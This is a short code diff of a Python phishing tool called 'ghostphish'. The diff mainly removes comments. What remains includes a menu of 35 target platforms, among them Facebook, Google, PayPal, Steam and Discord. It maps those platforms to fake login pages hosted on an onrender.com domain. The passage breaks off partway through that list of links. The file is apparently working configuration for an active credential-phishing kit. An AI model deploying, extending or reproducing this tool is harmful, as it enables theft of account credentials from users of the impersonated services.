@@ -1,5 +1,4 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+
 import urllib.request
 import urllib.parse
 import json
@@ -9,17 +8,17 @@ import threading
 import time
 import sys
 
-# ========== الألوان ==========
+
 ORANGE = "\033[38;5;208m"
 RED = '\033[91m'
 WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
-# =============================
+
 
 CONFIG_FILE = "ghostphish_config.json"
 
-# ─── الأسماء المعدلة (حذف الزوائد) ───
+
 PLATFORMS = {
     1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
     6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tok",
@@ -30,7 +29,7 @@ PLATFORMS = {
     31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
 }
 
-# ─── الروابط الفعلية بعد مطابقة أسماء الملفات ───
+
 LINKS = {
     1: "https://s-djbh.onrender.com/facebook.html",
     2: "https://s-djbh.onrender.com/instagram.html",
